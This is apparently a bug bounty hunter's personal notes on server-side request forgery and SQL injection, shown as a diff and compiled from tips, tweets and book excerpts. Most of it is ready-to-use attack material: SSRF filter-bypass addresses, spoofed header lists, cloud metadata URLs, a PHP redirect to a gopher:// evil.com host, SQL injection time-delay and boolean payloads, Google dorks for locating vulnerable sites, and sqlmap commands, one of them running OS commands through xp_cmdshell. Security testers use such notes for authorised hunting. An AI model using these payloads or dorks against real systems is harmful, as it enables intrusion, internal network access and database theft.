@@ -627,3 +627,1648 @@ Open in Archive.today
 Open in Archive.is
 Open in Proxy API
 Iframe/gist/embeds are not loaded in the Google Cache proxy. For those, please use the Read-Medium/Archive proxy instead.
+
+
+[URL validation bypass cheat sheet for SSRF/CORS/Redirect - 2024 Edition | Web Security Academy](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet?s=08)
+
+### Server Side Request Forgery (SSRF)
+
+Server Side Request Forgery is the in-scope domain issuing a request to an
+URL/endpoint you've defined. This can be for multiple reasons and sometimes it
+doesn't always signal the target is vulnerable. 
+
+- When hunting for SSRF I specifically look for features which already take an URL parameter. Why? Because as mentioned earlier I am looking for specific areas of a website where a developer may
+have created a filter to prevent malicious activity. For example, on large bug bounty
+programs I will instantly try to find their API console (if one is available, usually found
+on their developer docs page). This area usually contains features which already
+take a URL parameter and execute code. Think about webhooks. As well as hunting
+for features which handle a URL, just simply keep an eye out for common parameter
+names used for handling URLs. I found SSRF on Yahoo from doing simply this as a
+request was made which contained the parameter “url”. Another great example is
+this disclosed report from Jobert Abma, https://hackerone.com/reports/446593. The
+feature was right in front of him and required no special recon or brute forcing.
+- When testing for SSRF you should always test how they handle redirects. You can
+actually host a redirect locally via using XAMPP & NGrok. XAMPP allows you to run
+PHP code locally and ngrok gives you a public internet address (don’t forget to
+turn it off when finished testing! refer to https://www.bugbountyhunter.com/ for a
+tutorial on using XAMPP to aid you in your security research).
+- Setup a simple redirect script and see if the target parses the redirect and follows. What happens if
+you add sleep(1000) before the redirect, can you cause the server to hang and time
+out? Perhaps their filter is only checking the parameter value and doesn't check the
+redirect value and successfully allows you to read internal data. Don’t forget to try
+using a potential open redirect you have discovered as part of your chain if they are
+filtering external websites.
+- Aside from looking for features on the website which takes a URL parameter, always
+hunt for any third-party software they may be using such as Jira. Companies don't
+always patch and leave themselves vulnerable so always stay up to date with the
+latest CVE's. Software like this usually contains interesting server related features
+which can be used for malicious purposes.
+
+## Types of ssrf➖
+
+1. Blind ssrf :- allow to scan for accessable hosts and ports.
+2. Full response:- Allow you to see the entire response from the server
+3. Limited or no response: shows a portion of the response like the title of the page or no response or you have access to resources but you cannot see them.
+
+## Finding Your First SSRF!
+
+Let’s review the steps you can take to find your first SSRF:
+
+1. Spot the features prone to SSRFs and take notes for future reference.
+2. Set up a callback listener to detect blind SSRFs by using an online ser-
+vice, Netcat, or Burp’s Collaborator feature.
+3. Provide the potentially vulnerable endpoints with common internal
+addresses or the address of your callback listener.
+4. Check if the server responds with information that confirms the SSRF.
+Or, in the case of a blind SSRF, check your server logs for requests from
+the target server.
+5. In the case of a blind SSRF, check if the server behavior differs when
+you request different hosts or ports.
+6. If SSRF protection is implemented, try to bypass it by using the strate-
+gies discussed in this chapter.
+7. Pick a tactic to escalate the SSRF.
+8. Draft your first SSRF report!
+
+## Escalating a attack
+
+1. Perform a network scan.
+2. Pull instance meta data.
+- Try to exploit blind ssrf using
+    - Port scanning using http status code
+    - Port scanning using http response timing
+
+## Checkpoints:
+
+- Searchbox
+- Redirecting URL
+- Upload Option
+- Check Cookies
+- Header
+- Cookie Box
+- Redirecting URIs
+- Endpoints which fetch internal/external resources.
+- Try to change URIs in post request.
+- SVG images
+
+- Webhooks
+- file uploads
+- documents
+- image processor
+- link expansions
+- thumbnails
+- proxy servers
+- parameters which are trying to fetch internal or storage data
+- open redirect —> SSRF
+- File imports
+- PDF Generators
+- Referrer header —> burp app.[interact](http://interact.sh)sh.com       —> port scanning —> bypass waf
+
+![ssrf_.jpeg](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/43fda9ab-898e-4cfa-a558-5701b8cb117b/ssrf_.jpeg)
+
+## Exploiting blind ssrf
+
+→Blind SSRFs don’t return a response or error message, their exploi-
+tation is often limited to network mapping, port scanning, and service
+discovery. Also, since you can’t extract information directly from the target
+server, this exploitation relies heavily on inference. Yet by analyzing HTTP
+status codes and server response times, we can often achieve results similar
+to regular SSRF.
+
+- Network and Port Scanning Using HTTP Status Codes
+    
+    HTTP status codes provide information about
+    whether the request succeeded. By comparing the response codes returned
+    for requests to different endpoints, we can infer which of them are valid. For
+    example, if a request for https://public.example.com/webhook?url=10.0.0.1 results
+    in an HTTP status code of 200, while a request for https://public.example.com/
+    webhook?url=10.0.0.2 results in an HTTP status code of 500, we can deduce that
+    10.0.0.1 is the address of a valid host on the network while 10.0.0.2 is not.
+    Port scanning with blind SSRF works the same way. If the server
+    returns a 200 status code for some ports, and 500 for others, the 200 status
+    code might indicate open ports on the machine. On the other hand, if all
+    requests return the same status code, the site might have implemented pro-
+    tection against SSRF port scanning.
+    
+- Network and Port Scanning Using Server Response Times
+    
+    If the server isn’t returning any useful information in the form of status
+    codes, you might still be able to figure out the network structure by examin-
+    ing how long the server is taking to respond to your request. If it takes much
+    longer to respond for some addresses, those network addresses might be
+    unrouted or hidden behind a firewall. Unrouted addresses cannot be reached
+    from the current machine. On the other hand, unusually short response
+    times may also indicate an unrouted address, because the router might have
+    dropped the request immediately.
+    When performing any kind of network or port scanning, it is impor-
+    tant to remember that machines behave differently. The key is to look for
+    differences in behavior from the machines on the same network, instead
+    of the specific signatures like response times or response codes described
+    previously.
+    The target machine might also leak sensitive information in outbound
+    requests, such as internal IPs, headers, and version numbers of the software
+    used. If you can’t access an internal address, you can always try to provide
+    the vulnerable endpoint with the address of a server you own and see what
+    you can extract from the incoming request.
+    
+- Attack the Network
+    
+    Use what you’ve found by scanning the network, identifying services, and
+    pulling instance metadata to execute attacks that have impact. Notably, you
+    may be able to bypass access controls, leak confidential information, and
+    execute code.
+    First, try to bypass access control. Some internal services might control
+    access based on IP addresses or internal headers only, so it might be pos-
+    sible to bypass controls to sensitive functionalities by simply sending the
+    request from a trusted machine. For example, you might be able to access
+    internal websites by proxying through a web server:
+    
+    https://public.example.com/proxy?url=https://admin.example.com
+    
+    You can also try to execute internal API calls through the SSRF end-
+    point. This type of attack requires knowledge about the internal system
+    and API syntax, which you can obtain by conducting recon and via other
+    information leaks from the system. For example, let’s say the API endpoint
+    [admin.example.com/delete_user](http://admin.example.com/delete_user) deletes a user and can only be requested by an
+    internal address. You could trigger the request if you find an SSRF that lets
+    you send a request from a machine in the trusted network:
+    
+    https://public.example.com/send_request?url=https://admin.example.com/delete_user?user=1
+    
+    Second, if you were able to find credentials using the SSRF by leaking
+    info via headers or by querying instance metadata, use those credentials
+    to access confidential information stored on the network. For example, if
+    you were able to find Amazon S3 keys, enumerate the company’s private S3
+    buckets and see if you can access them with the credentials you found.
+    Third, use the info you gathered to turn SSRF into remote code execu-
+    tion (which you’ll learn more about in Chapter 18). For example, if you
+    found admin credentials that give you write privileges, try uploading a shell
+    to the web server. Or, if you found an unsecured admin panel, see if any fea-
+    tures allow the execution of scripts. You can also use either classic or blind
+    SSRF to test for other vulnerabilities on the target’s network by sending pay-
+    loads designed to detect well-known vulnerabilities to reachable machines.
+    
+
+## Potential blockers and solutions
+
+- Whitelisting:only allow few domain names to be used in the request.
+    - Sol: Find an open redirect
+
+- Blacklisting: Block access to internal IP addresses, domains or keywords.
+    - Sol: Create a custom CNAME and point it to the Internal IP address of your target
+    
+    ### Tools➖
+    
+    - http://nip.io
+    - http://tools.intigriti.io/redirector
+    - Beeceptor.com
+    
+    [GitHub - pwn0sec/PwnSSRF: A Python based scanner to find potential SSRF parameters in a web application.](https://github.com/pwn0sec/PwnSSRF)
+    
+    [GitHub - Th0h0/autossrf: Smart context-based SSRF vulnerabiltiy scanner.](https://github.com/Th0h0/autossrf)
+    
+
+- If services allow particular file type
+    - Sol: Restricted Content-Type, extentions or charactor-manual fuzing or creating a bypass.
+
+- No response: You may not able to see the response from the request.
+    - Sol: Javascript XHR to retrive file content.
+
+## What can we do:-
+
+- Access internal services (which is not possible from outside network)
+- Read internal files
+- Scan third party apps through vulnerable apps
+
+## Tips:
+
+- Use nmap to scan ports
+- Use nslookup to find server IP
+- Use encoding if blocked
+    
+    URL encoding
+    
+    Double URL encoding
+    
+
+- Check whitelisted part by removing them from request.
+    - If response is 200 then they are not whitelisted
+
+- Try to use IPv6 addresses (to bypass filter)
+    
+    → Sometimes the SSRF protection mechanisms a site has implemented for IPv4 might not have been implemented for IPv6.That means you can try to submit IPv6 addresses that point to local network.
+    
+
+- Try to encode a specific alphabet of the word
+    - admin   ———>   Encode it in double URL to bypass filters.
+
+- Hunt for blind ssrf
+    - Check for blind ssrf using burp collaborator
+    - try to connect with ngrok
+    - open the netcat listener
+
+- If a system is using a webhosting like :-
+    - AWS EC2 metadata
+        - http://ip (server)/latest/meta-data
+        - http://ip (server)/latest/meta-data/local_hostname
+        - http://i (server)/latest/meta-data/public-hostname
+
+- Use [::]  as the hostname to bypass th filter.
+
+- Try to host a php file on a particular server and call it using URL.
+    
+    ```php
+    *In your own domain
+    
+    <?PHP
+    header("location:http://[::]:22/");
+    ?>
+    
+    ex:- To bypass the protection, i used the location header in PHP.
+    ```
+    
+- Exploiting gopher
+    
+    ```php
+    ex: http://example.com/ssrf.php?url=http://attacker.com/gopher.php
+    
+    gopher.php:
+     <?PHP
+        header('location:gopher://evil.com:1337/__HI%0Assrf%0Atest');
+     ?>
+    ```
+    
+
+- Scheme://user:pass@host:port/path?query=value#fragment
+    - Bypass the scheme whitelisting by using➖
+    - String value:10.0.0.3
+    - Binary:00001010.00000000.00000000.00000011
+    - Hexadecimal:0A.00.00.03
+    - Integer:167772163
+
+- Try to apply the payload just after the request type and before location.
+    - GET  [xyz.burpcollaborator.net](http://xyz.burpcollaborator.net)  /xyz.php
+
+- In such way, http://265.0.0.3/ could also work for http://10.0.0.3/ target, (because 265 is too big for 8 bits it resets at 255 and become 10)
+
+- Exploiting SSRF using file upload
+    - Create a .svg file (of xml)
+    - try to upload it in image upload
+    - Intercept the image and change the content type to img.
+    - Try to open the image.
+    
+- Local IP address of EC2 (AWS EC2) instance is 169.254.169.254
+
+## Main headers with link testing:-
+
+- [ ]  True-client IP:
+- [ ]  X-wap-profile:
+- [ ]  X-client-Profile:
+- [ ]  CF-Connecting_IP:
+- [ ]  X-Forwarded-For:
+- [ ]  Client-IP:
+- [ ]  X-Originating-IP:
+
+[GitHub - cujanovic/SSRF-Testing: SSRF (Server Side Request Forgery) testing resources](https://github.com/cujanovic/SSRF-Testing)
+
+## Extentions
+
+- Burp suite collaborator
+- Collaborator
+- Exploit blind ssrf using
+    - Burp collaborator
+    - netcat
+    - ngrok
+
+## Testable protocols:-
+
+- [ ]  gopher:// (File Distribution)
+- [ ]  ssh2://
+- [ ]  rar://
+- [ ]  dict:// ( dictionary network protocol)
+- [ ]  ftp:// (File Transfer Protocol)
+- [ ]  File:// (File URI Scheme)
+- [ ]  ldap:// ( Lightweight Directory Access Protocol)
+- [ ]  glob://
+- [ ]  data://
+- [ ]  SMTP:// (simple mail transfer protocol)
+
+- [ ]  ogg://
+- [ ]  pop3://
+- [ ]  sftp://
+- [ ]  tftp://
+- [ ]  imap://
+- [ ]  jar://
+- [ ]  netdoc://
+- [ ]  expect://
+- [ ]  php://
+- [ ]  2lib://
+- [ ]  phar://
+
+```jsx
+http://0.0.0.0
+http://0
+http://0x7f000001
+http://2130706433
+http://0000::1
+http://0000::1:25
+http://0000::1:22
+http://0000::1:3128
+http://2130706433
+http://3232235521
+http://3232235777
+
+```
+
+```solidity
+Base-Url: 127.0.0.1
+Client-IP: 127.0.0.1
+Http-Url: 127.0.0.1
+Proxy-Host: 127.0.0.1
+Proxy-Url: 127.0.0.1
+Real-Ip: 127.0.0.1
+Redirect: 127.0.0.1
+Referer: 127.0.0.1
+Referrer: 127.0.0.1
+Refferer: 127.0.0.1
+Request-Uri: 127.0.0.1
+Uri: 127.0.0.1
+Url: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forward-For: 127.0.0.1
+X-Forwarded-By: 127.0.0.1
+X-Forwarded-For-Original: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Port: 443
+X-Forwarded-Port: 4443
+X-Forwarded-Port: 80
+X-Forwarded-Port: 8080
+X-Forwarded-Port: 8443
+X-Forwarded-Scheme: http
+X-Forwarded-Scheme: https
+X-Forwarded-Server: 127.0.0.1
+X-Forwarded: 127.0.0.1
+X-Forwarder-For: 127.0.0.1
+X-Host: 127.0.0.1
+X-Http-Destinationurl: 127.0.0.1
+X-Http-Host-Override: 127.0.0.1
+X-Original-Remote-Addr: 127.0.0.1
+X-Original-Url: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Proxy-Url: 127.0.0.1
+X-Real-Ip: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Rewrite-Url: 127.0.0.1
+X-True-IP: 127.0.0.1
+```
+
+```jsx
+http://2852039166
+http://0o177.0.0.1
+http://127.0.1
+http://127.1
+http://0.0.0.0
+http://0
+http://0x7f000001
+http://2130706433
+http://017700000001
+http://[::]:80
+http://[::]:22
+```
+
+[→You can use this tool to convert IP address ](https://h.43z.one/ipconverter/)
+
+→You can use this tool to convert IP address 
+
+### parameters:
+
+```solidity
+dest
+redirect
+uri
+path
+continue
+url
+window
+next
+data
+reference
+site
+html
+val
+validate
+domain
+callback
+return
+page
+feed
+host
+port
+to
+out
+view
+dir
+show
+navigation
+```
+
+### **LABS**
+
+https://twitter.com/harshbothra_/status/1516031297012989954
+
+## Writeups:-
+
+[Piercing the Veil: Server Side Request Forgery to NIPRNet access](https://infosecwriteups.com/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a)
+
+[U.S. Dept Of Defense disclosed on HackerOne: SSRF+XSS](https://hackerone.com/reports/326043)
+
+[U.S. Dept Of Defense disclosed on HackerOne: SSRF vulnerability on...](https://hackerone.com/reports/310036)
+
+[How I got $400 for my first SSRF bug?](https://blog.usamav.dev/how-i-got-400-usd-for-my-first-ssrf-bug?utm_campaign=HackLearnDaily%20by%20Anugrah%20SR&utm_medium=email&utm_source=Revue%20newsletter)
+
+[SecurityExplained/htmli-to-cloud-ssrf.md at main · harsh-bothra/SecurityExplained](https://github.com/harsh-bothra/SecurityExplained/blob/main/resources/htmli-to-cloud-ssrf.md)
+
+→HTML injection to cloud metadata ssrf
+
+[GitHub - cujanovic/SSRF-Testing: SSRF (Server Side Request Forgery) testing resources](https://github.com/cujanovic/SSRF-Testing)
+
+[Finding SSRF via HTML Injection inside a PDF file on AWS EC2](https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90)
+
+[Getting shell and data access in AWS by chaining vulnerabilities](https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed)
+
+https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/
+
+[A Fun SSRF through a Headless Browser](https://corben.io/fun-ssrf-via-headless-browser/)
+
+[SVG SSRFs and saga of bypasses](https://infosecwriteups.com/svg-ssrfs-and-saga-of-bypasses-777e035a17a7)
+
+[GitHub - allanlw/svg-cheatsheet: A cheatsheet for exploiting server-side SVG processors.](https://github.com/allanlw/svg-cheatsheet)
+
+[How Gopher works in escalating SSRFs](https://infosecwriteups.com/how-gopher-works-in-escalating-ssrfs-ce6e5459b630)
+
+[SSRF vulnerabilities and where to find them - Detectify Labs](https://labs.detectify.com/2022/09/23/ssrf-vulns-and-where-to-find-them/)
+
+[Corben Leo on Twitter / X](https://x.com/hacker_/status/1694554700555981176?s=20)
+
+
+- Cheatsheets:
+    
+    [SQL injection cheat sheet | Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+    
+    [SQL Injection Cheat Sheet | Invicti](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
+    
+    [MySQL SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
+    
+    https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet
+    
+    [The Ultimate SQL Injection Cheat Sheet](https://www.hackingloops.com/sql-injection-cheat-sheet/)
+    
+    [SQL Injection | HackTricks - Boitatech](https://hacktricks.boitatech.com.br/pentesting-web/sql-injection)
+    
+
+SQL Injection (SQL) is a classic vulnerability that doesn’t seem to be going anywhere.
+This vulnerability can be exploited to dump the contents of an applications database.
+Databases typically hold sensitive information such as usernames and passwords so
+gaining access to this is basically game over. The most popular database is MySQL but
+you will run into others such as MSSQL, PostgreSQL, Oracle, and more.
+
+[Web-Sec-CheatSheet/sqlmap.md at master · imran-parray/Web-Sec-CheatSheet](https://github.com/imran-parray/Web-Sec-CheatSheet/blob/master/sqlmap.md)
+
+## Tips by Godfather:-
+
+- Focus on errors
+- try to create errors  using sign like ‘, “  etc.
+- Where can we inject?
+    
+    →GET
+    
+    →POST
+    
+- New Endpoints:- (Mostly GET endpoints)
+    
+    https://xyz.com/frame/login 
+    
+    →https://xyz.com/frame/loginSQL=123
+    
+    → https://xyz.com/frameSQL/
+    
+    → https://xyz.com/frame/login=SQL
+    
+    →domain.com/app_dev.php/1SQL
+    
+    →domain.com/url?SQL=1
+    
+- Also test URLs without any parameters.
+- Try to add SQL payloads in every entry point.
+    
+    →admin=adminSQL&passwd=pwd 
+    
+- Try SQL injection in login panels, panels, etc.
+    
+    → sqlmap -a “url.com/1*”
+    
+- Check delete user option.
+- Test the sign-in or register functionality
+- test the subscribe/unsubscribe email functionality.
+- test other email functionality as well.
+- manually test the cookie based sql injections.
+- also test HTTP headers like
+    - X-Forwarded-For
+    - referrer header
+    - User-agent
+    - Sec-Fetch-Dest:DocumentSQL
+    - User-agent
+    - Referer
+
+- Test the login functionality.
+- Try to target admin/administrator panels.
+- look for odd cookies and test them.
+
+[MTN Group disclosed on HackerOne: SQL Injection on the...](https://hackerone.com/reports/865436)
+
+```jsx
+step by step guide by @GodfatherOrwa
+
+sqlmap -r request -p parameter --level 5 --risk 3 --random-agent --time-sec=5 --hostname 
+
+if target run with https add to command --force-ssl
+
+If that not work to bypass the waf 
+you can try something else like:
+
+change request method To Get
+sqlmap -u "url" -p parameter --level 5 --risk 3 --random-agent --hostname --time-sec=5
+```
+
+```sql
+@GodfatherOrwa
+*try login with admin admin and send login request  to burp
+*do an active scan
+if show SQL injection with parameter 
+#POC 
+copy request in txt 
+and on sqlmap 
+sqlmap -r sql.txt --force-ssl --level 5 --risk 3 --dbs -p parameter
+or
+sqlmap -r sqlitest.txt --batch --current-db --force-ssl
+```
+
+```jsx
+How to find SQLI using Shodan
+1. Shodan dork: SSL:""
+2. Found employee's admin portal and username input vulnerable to sqli.
+3. Sqlmap command:
+Sqlmap  -r req.txt --batch --force-ssl --level 5 --risk 3 --dbs --hostname --current-user -p "username"
+```
+
+google Dorks
+
+```jsx
+intext:"error in your SQL syntax"
+intext:"mysql_num_rows()" 
+in****:"mysql_fetch_array()" 
+in****:"Error Occurred While Processing Request" 
+in****:"Server Error in '/' Application" 
+in****:"Microsoft OLE DB Provider for ODBC Drivers error" 
+in****:"InvalidQuerystring" 
+in****:"OLE DB Provider for ODBC" 
+in****:"VBScript Runtime" 
+in****:"ADODB.Field" 
+in****:"BOF or EOF" 
+in****:"ADODB.Command" 
+in****:"JET Database" 
+in****:"mysql_fetch_row()" 
+in****:"Syntax error" 
+in****:"include()" 
+in****:"mysql_fetch_assoc()" 
+in****:"mysql_fetch_object()" 
+in****:"mysql_numrows()" 
+in****:"GetArray()" 
+in****:"FetchRow()" 
+in****:"Input string was not in a correct format" 
+inurl:/id= intext:"You have an error in your SQL syntax" 
+inurl:&#8221;main.php?t=
+inurl:&#8221;games.php?id=
+inurl:&#8221;guide.php?id=
+inurl:&#8221;index.php?cat=
+allinurl:&#8221;review.php?sid=
+inurl:&#8221;index2.php?id=
+inurl:&#8221;main.php?id=
+inurl:zoom.php?id=site:.il
+inurl:&#8221;details.php?id=
+inurl:&#8221;?came=
+inurl:&#8221;index.php?page=
+inurl:&#8221;home.php?cat=
+inurl:&#8221;index2.php?id=
+```
+
+```sql
+@GodfatherOrwa
+#bugbountytips #bugbountytip #tip
+90% from my finds in SQL injection as
+ [POST Request] 
+1 Login page in username parameter 
+2 Forget password page username parameter
+3 Singup Page firstname and last name parameter
+
+Reference Payloads:-
+
+' WAITFOR DELAY '0:0:5'--
+';WAITFOR DELAY '0:0:5'-- 
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+
+' OR 1=1--
+' OR 1=0--
+%27%20or%201=1
+*(|(object=*))
+)%20or%20('x'='x
+%20or%201=1
+1) or pg_sleep(__TIME__)--
+/**/or/**/1/**/=1
+' or username like '%
+);waitfor delay '0:0:__TIME__'--
+or isNULL(1/0) /*
+x' or 1=1 or 'x'='y
+
+If sometimes you cant exploits  
+change request form POST to GET 
+if the same with the url injection try change request form GET to POST
+
+In sqlmap 
+
+sqlmap -r request.txt -p parameter-name --force-ssl --level 5 --risk 3  --dbs --hostname --current-user
+```
+
+```jsx
+SQL Injection
+RCE Due xp_cmdshell was enabled
+
+ sqlmap -r request.txt --force-ssl -p pramater --level 5 --risk 2 -dbms="Microsoft SQL Server" --os-cmd="ping http://your.burpcollaborator.net"
+```
+
+```jsx
+SQL injection in File Upload functionality
+->So the parameter was Filename,
+
+Filename="abc.jpgSQL"
+```
+
+- Try to inject the payload in every parameter
+- Try to inject payloads manually…. if not successful then you can also use Active Scan (of Burp suite)
+
+### SQLi manual approach by tushar Verma
+
+- First thing to test for an SQL injection is to try to break the query,with the intention of getting the syntax of how SQL is getting input at the backend. This technique works in UNION/Error based SQL Injections,where we force the backend database to throw an error.
+- Using this technique,we can somehow determine the backend query structure to efficiently exploit SQL Injection.Query can be broken by throwing various characters as input.
+- Afterwards an escape character \ can be used just to make sure what is breaking the query.Once it is guessed how exactly SQL is taking input, we’ll try to break and then fix the query.
+- try to break the query,
+
+This step is necessary to determine where we can put our own malicious query, that will be executed at the backend.
+
+The query can be fixed in some of the ways below:
+‘’    --+
+‘    --+
+‘’    #
+‘     \*    *\
+‘    -- -
+'     or    '1
+
+- To know what DBMS is running at the backend, error messages can tell a lot,
+
+But in the case of Blind Injections, another way is to determine through different numeric functions like:
+
+Oracle: BITAND(1,1)
+MySQL: POW(1,1)
+SQL Server: SQUARE(1,1)
+
+- For example if “list.php?id=8” and “list.php?id=9- POW(1,1)” is returning the same output,it means MySQL is running at the backend.
+
+Every DBMS uses different concatenation operators to store text input
+Eg:
+
+Oracle:  'que' || 'ry’
+MySQL: ‘que’ ‘ry’
+SQL Server: ‘que’ + ‘ry’
+
+For example if “id=query” and “id=’que’ || ‘ry’” is returning the same output, it means Oracle is running at the backend.
+
+[The SQL Injection Knowledge Base](https://websec.ca/kb/sql_injection)
+
+⇒This is all you need for SQL-injection
+
+https://twitter.com/NinadMishra5/status/1639663431430311936?s=20
+
+![Fif_q2gaYAEwcKC.jpg](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0defdc67-d1a4-49ae-ac2a-b2dd1b07832c/Fif_q2gaYAEwcKC.jpg)
+
+![Fif_yoDaAAAj70d.jpg](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/88385a70-c2d0-4997-940b-00ed0892538b/Fif_yoDaAAAj70d.jpg)
+
+## Tips by Rana khalil:-
+
+- Map the application
+- Fuzz the application
+    
+    →Submit SQL-specific characters, such as ‘ or “, and look for errors or other anomalies.
+    
+    →Submit Boolean conditions such as OR 1=1 and OR 1=2,
+    
+    and look for differences in the application's responses
+    
+    →Submit payloads designed to trigger time delays when
+    
+    executed within a SQL query, and look for differences in
+    
+    the time taken to respond
+    
+    →Submit OAST payloads designed to trigger an out-of-band
+    
+    network interaction when executed within an SQL query,
+    
+    and monitor for any resulting interactions
+    
+    # **SQLi in Email parameter**
+    
+    [Untitled](https://www.notion.so/ac15a80147924d2c8ce7db494d9a17d5?pvs=21)
+    
+    - One thing to note is typically legacy code is more vulnerable to SQL injection so
+    keep an eye out for old features. SQL injection can simply be tested across the site
+    as most code will make some sort of database query (for example when searching, it
+    will have to query the database with your input). When testing for SQL injection yes
+    you could simply use ‘ and look for errors but a lot has changed since the past &
+    these days a lot of developers have disabled error messages so I will always go in
+    with a sleep payload as usually these payloads will slip through any filtering. As well
+    as this it is easier to indicate if there is a delay on the response which would mean
+    your payload was executed blindly. I typically use sleep payloads such as: (I will use
+    between 15-30 seconds to determine if the page is actually vulnerable)
+    ' or sleep(15) and 1=1#
+    ' or sleep(15)#
+    ' union select sleep(15),null#
+    When testing for SQL injection I will take the same approach as XSS and test
+    throughout the web application.
+    
+    ![Fr1uGTjXgAAHKHK.jpg](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/97ed4963-958b-499a-afd4-63dc06966777/Fr1uGTjXgAAHKHK.jpg)
+    
+
+https://raw.githubusercontent.com/rkhal101/Web-Security-Academy-Series/main/sql-injection/theory/SQL%20Injection%20Complete%20Guide.pdf
+
+- — → for commit out
+
+union
+→ the union operator is used in SQL to combine the results of two or more select statement into a single result set.
+
+- When the result of two queries are combine using UNION operator,
+→ The two result set must have the same structure. In simple words, they must-have the same numbers of columns, which must have the same or computable data types, appearing in the same order.
+→ To inject a second query, they will return interesting results, the attacker need to know the name of the database table that he wants to target and the name of its relevant columns.
+→ Each datatype in the second query must either be identical to the corresponding type in the first or be implicitly convertible to it.
+→ The value null can be converted to any datatype. Hence, if you do not know the datatype of the particular field, you can simply SELECT NULL for that field.
+
+There re two effective ways to determine how many, ways to determine how many columns are being returned from the original query.
+
+i) inject in a series of ORDER BY.
+*when the specified column exceeds the number of actual columns in the result set,the database return an error, such as:-
+"The ORDER BY position number 3 is out of range of the number items in the select list"
+
+ii)The second method is UNION SELECT
+'UNION SELECT NULL--
+'UNION SELECT NULL,NULL--
+'UNION SELECT NULL,NULL,NULL--
+etc.....
+
+If the number of null does not match the number of columns, the database return an error such as :-
+"All queries combine using UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target list"
+
+- We will also look for column which can support string as we need to extract data in string format.
+- Check if column holds string value using string parameter:-
+- if the data of a column is not capable with string data, the injected query will cause a datatype error such as:-
+"Conversion failed when connecting the catcher value 'a' to datatype int.
+*if an error does not occur and the application's response contain some additional content including the injected string value, then the relevant column is suitable for retrieving data.
+- The information_schema table stores all tables in the database, but to gain administrative privileges we only need to know that table which contains credentials.
+ex:- 'union select table_name,null from information_schema.tables--
+
+Different DBMS have different in built functions to get version string of database
+
+Here is a cheat sheet
+
+ORACLE:
+SELECT banner FROM v$version
+
+SELECT version FROM v$instance
+
+MSSQL:
+
+SELECT @@version
+
+PostgreSQL:
+
+SELECT version()
+
+MYSQL:
+
+SELECT @@version
+
+cheatsheet:
+
+[SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
+
+Top 25 SQL Injection Parameters for @trbughunters
+
+?id=
+?page=
+?dir=
+?search=
+?category=
+?file=
+?class=
+?url=
+?news=
+?item=
+?menu=
+?lang=
+?name=
+?ref=
+?title=
+?view=
+?topic=
+?thread=
+?type=
+?date=
+?form=
+?join=
+?main=
+?nav=
+?region=
+
+Then follow this road map to start finding real SQL injection vulnerabilities in the wild:
+
+1. Map any of the application’s endpoints that take in user input.
+2. Insert test payloads into these locations to discover whether they’re
+vulnerable to SQL injections. If the endpoint isn’t vulnerable to classic
+SQL injections, try inferential techniques instead.
+3. Once you’ve confirmed that the endpoint is vulnerable to SQL injec-
+tions, use different SQL injection queries to leak information from the
+database.
+4. Escalate the issue. Figure out what data you can leak from the endpoint
+and whether you can achieve an authentication bypass. Be careful not
+to execute any actions that would damage the integrity of the target’s
+database, such as deleting user data or modifying the structure of the
+database.
+5. Finally, draft up your first SQL injection report with an example pay-
+load that the security team can use to duplicate your results. Because
+SQL injections are quite technical to exploit most of the time, it’s a
+good idea to spend some time crafting an easy-to-understand proof of
+concept.
+
+### Articles/Write-ups/Reports
+
+[SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
+
+[SQL Injection Payload List](https://ismailtasdelen.medium.com/sql-injection-payload-list-b97656cfd66b)
+
+→SQL  injection payloads
+
+[GitHub - kleiton0x00/Advanced-SQL-Injection-Cheatsheet: A cheat sheet that contains advanced queries for SQL Injection of all types.](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet)
+
+[GitHub - s0md3v/sqlmate: A friend of SQLmap which will do what you always expected from SQLmap.](https://github.com/s0md3v/sqlmate)
+
+[GitHub - sqlmapproject/sqlmap: Automatic SQL injection and database takeover tool](https://github.com/sqlmapproject/sqlmap)
+
+[Multiple ways to find sql and cheatsheet](https://thenurhabib.medium.com/multiple-ways-to-find-sql-and-cheatsheet-45f17fed7b59)
+
+[SQL injection cheat sheet | Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+[GitHub - kleiton0x00/Advanced-SQL-Injection-Cheatsheet: A cheat sheet that contains advanced queries for SQL Injection of all types.](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet)
+
+https://cybr.com/ethical-hacking-archives/sqlmap-cheat-sheets-to-help-you-find-sql-injections/
+
+### Special Reports/articles/write-ups
+
+[SQL injection through User-Agent](https://medium.com/@frostnull/sql-injection-through-user-agent-44a1150f6888)
+
+[SQL injection through HTTP headers - Infosec Resources](https://resources.infosecinstitute.com/topic/sql-injection-http-headers/)
+
+[How to do a Sql Injection Attack Through a user-agent.](https://medium.com/@hninja049/how-to-do-a-sql-injection-attack-through-a-user-agent-dd0e0c9b9c36)
+
